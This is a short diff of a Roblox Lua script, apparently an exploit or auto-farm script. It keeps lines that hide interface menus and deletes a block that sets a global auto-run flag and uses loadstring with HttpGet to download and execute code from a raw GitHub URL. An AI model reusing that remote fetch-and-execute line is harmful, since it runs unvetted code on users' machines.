@@ -15,10 +15,6 @@ game:GetService('StarterGui'):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, fal
 game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
 end)
 
-task.spawn(function()
-_G.autoMillionerRun = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/crztesting/scgoodef/main/punchingknox"))()
-end)
 
 
 
